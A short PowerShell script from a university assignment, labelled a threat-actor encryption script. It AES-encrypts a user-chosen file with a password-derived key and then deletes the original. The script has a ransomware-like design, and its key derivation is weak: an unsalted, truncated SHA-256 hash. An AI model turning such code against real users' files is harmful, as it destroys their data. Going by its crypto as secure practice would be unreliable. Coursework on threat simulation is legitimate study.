# Encryption Threat actor script written for COIT11241 Subject
# Assignment 2
# Tevin Herath
# # Acknowledgment: Some copntent of this script was generated using ChatGPT 
# ----------------------------------------------------------------

# Function to encrypt a file
function Encrypt-File {
    param (
        [string]$FilePath,
        [string]$Password,
        [string]$OutputPath
    )

    # Create an AES instance
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.KeySize = 128

    # Hash the password using SHA256 and use the first 16 bytes for the AES key (for AES-128)
    $hashedPassword = Get-Hash $Password
    $aes.Key = $hashedPassword[0..15]

    # Generate a random 16-byte IV
    $aes.GenerateIV()
    $iv = $aes.IV

    # Read the content of the file to be encrypted
    $fileContent = [System.IO.File]::ReadAllBytes($FilePath)

    # Create an encryptor and memory stream
    $encryptor = $aes.CreateEncryptor($aes.Key, $iv)
    $memoryStream = New-Object System.IO.MemoryStream
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

    # Encrypt the file content
    $cryptoStream.Write($fileContent, 0, $fileContent.Length)
    $cryptoStream.Close()

    # Combine IV with the encrypted content (IV is required for decryption)
    $encryptedContent = $memoryStream.ToArray()
    $combinedContent = $iv + $encryptedContent

    # Write the encrypted data (IV + encrypted content) to a file
    [System.IO.File]::WriteAllBytes($OutputPath, $combinedContent)

    Write-Host "File encrypted and saved at: $OutputPath"
}

# Function to hash the password using SHA256 (returns 32 bytes)
function Get-Hash {
    param ([string]$InputString)
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    return $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($InputString))
}

# Main Operations
$inputFile = Read-Host "Enter File you want to encrypt"
$password = Read-Host "Enter Encryption Password"
$outputFile = $inputFile + ".enc"

Encrypt-File -FilePath $inputFile -Password $password -OutputPath $outputFile

Remove-Item $inputFile

